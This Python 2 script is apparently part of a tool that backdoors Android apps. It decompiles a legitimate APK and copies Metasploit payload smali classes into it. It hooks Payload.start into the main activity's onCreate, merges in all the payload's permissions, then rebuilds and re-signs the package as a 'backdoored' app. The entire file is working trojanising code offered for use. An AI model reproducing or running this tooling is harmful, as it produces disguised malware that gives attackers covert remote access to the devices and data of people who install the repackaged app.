
#    Copyright (C) <2016>  <M U Suraj>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

# Created by suraj (#r00t)

import os
import re
from core import pycolor
import sys

pyc = pycolor.pyColor()

def decompile(mainapk):
	print pyc.Info("Decompiling apks...")
	os.system("./apktool.sh d -f %s"%mainapk)
	os.system("./apktool.sh d -f temp.apk")

def inject(mainapk):
	print pyc.Info("Injecting payload...")
	mainapkname = os.path.splitext(mainapk)[0]
	mk = "mkdir %s/smali/com/metasploit"%mainapkname
	os.system(mk)
	mk = "mkdir %s/smali/com/metasploit/stage"%mainapkname
	os.system(mk)
	cp = "cp temp/smali/com/metasploit/stage/Payload*  %s/smali/com/metasploit/stage/"%mainapkname
	os.system(cp)
	filemanifest = "%s/AndroidManifest.xml"%mainapkname
	fhandle = open(filemanifest,'r')
	fread = fhandle.read()
	fhandle.close()
	fread = fread.split('<action android:name="android.intent.action.MAIN"/>')[0].split('<activity android:')[1]
	acn = re.search('android:name=\"[\w.]+',fread)
	activityname = acn.group(0).split('"')[1]
	acpath = activityname.replace('.','/') + ".smali"
	smalipath = "%s/smali/%s"%(mainapkname, acpath)
	fhandle = open(smalipath,'r')
	fread = fhandle.read()
	fhandle.close()
	print pyc.Info("Injecting hooks in %s..."%activityname)
	fhalf = fread.split(";->onCreate(Landroid/os/Bundle;)V")[0]
	shalf = fread.split(";->onCreate(Landroid/os/Bundle;)V")[1]
	injection = ";->onCreate(Landroid/os/Bundle;)V\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
	total = fhalf + injection + shalf
	fhandle = open(smalipath,'w')
	fhandle.write(total)
	fhandle.close()
	print pyc.Succ("Hook injected -> metasploit/stage/Payload")

def permissions(mainapk):
	print pyc.Info("Adding permissions...")
	mainapkname = os.path.splitext(mainapk)[0]
	filemanifest = "temp/AndroidManifest.xml"
	fhandle = open(filemanifest,'r')
	fread = fhandle.readlines()
	prmns = []
	for line in fread:
		if('<uses-permission' in line):
			prmns.append(line.replace('\n',''))	
	fhandle.close()
	filemanifest = "%s/AndroidManifest.xml"%mainapkname
	fhandle = open(filemanifest,'r')
	fread = fhandle.readlines()
	half=[]
	for line in fread:
		if('<uses-permission' in line):
			prmns.append(line.replace('\n',''))
		else:
			half.append(line)
	prmns = set(prmns)
	fhandle.close()
	
	fhandle = open(filemanifest,'w')
	for i in half:
		if half.index(i)==2:
			for j in prmns:
				fhandle.write(j+"\n")
		else:
			fhandle.write(i)
	for i in prmns:
		print '\t',i.split('android:name="')[1].split('"')[0]
	print pyc.Succ("%d Permissions added."%(len(prmns)))
	
def rebuild(mainapk):
	print pyc.Info("Recompiling...")
	mainapkname = os.path.splitext(mainapk)[0]
	rebuild = "./apktool.sh b -f %s"%mainapkname	
	os.system(rebuild)
	print pyc.Info("Signing apk...")
	path = "%s/dist/%s"%(mainapkname,mainapk)
	signapk = "java -jar signapk.jar cert.x509.pem privatekey.pk8 %s %s-final.apk"%(path,mainapk[:-4])
	os.system(signapk)
	print pyc.Succ("Successfully backdoored and saved as %s-final.apk"%mainapk[:-4])

